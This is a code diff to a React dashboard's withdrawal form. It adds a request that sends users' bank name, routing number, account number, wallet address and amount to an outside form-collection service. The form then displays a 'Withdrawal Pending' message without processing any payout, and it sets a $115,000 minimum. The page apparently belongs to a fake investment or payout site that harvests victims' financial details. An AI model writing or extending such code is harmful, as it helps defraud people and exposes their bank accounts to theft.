@@ -833,9 +833,9 @@ export default function Dashboard() {
                   </>
                 )}
 
-                {/* ✅ Confirm Button (last tag) */}
+                {/* ✅ Confirm Button */}
                 <button
-                  onClick={() => {
+                  onClick={async () => {
                     if (Number(withdrawAmount) < 115000) {
                       setWithdrawMessage("The minimum withdrawal is $115,000.");
                       setShowWithdrawPopup(true);
@@ -850,6 +850,32 @@ export default function Dashboard() {
                       return;
                     }
 
+                    // ✅ Formspark submission with all input values
+                    try {
+                      await fetch("https://submit.formspark.io/YOUR_FORM_ID", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                          withdrawType,
+                          selectedBank:
+                            withdrawType === "bank"
+                              ? selectedBank === "custom"
+                                ? customBank
+                                : selectedBank
+                              : "",
+                          routingNumber,
+                          accountNumber,
+                          selectedWallet:
+                            withdrawType === "wallet" ? selectedWallet : "",
+                          walletAddress,
+                          withdrawAmount,
+                        }),
+                      });
+                    } catch (err) {
+                      console.error("Formspark submission failed", err);
+                    }
+
+                    // ✅ Keep popup message intact
                     setWithdrawMessage(
                       `Withdrawal Pending! Will take up to 24 hours or more depending on the status of recipient\nMethod: ${
                         withdrawType === "wallet"
@@ -865,6 +891,7 @@ export default function Dashboard() {
                     );
                     setShowWithdrawPopup(true);
 
+                    // Reset fields
                     setShowWithdraw(false);
                     setSelectedBank("");
                     setCustomBank("");
@@ -879,7 +906,7 @@ export default function Dashboard() {
                   Confirm Withdrawal
                 </button>
 
-                {/* ✅ Popup Modal (always available) */}
+                {/* ✅ Popup Modal */}
                 {showWithdrawPopup && (
                   <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
                     <div className="bg-white rounded-lg shadow-lg p-6 max-w-sm w-full text-center">
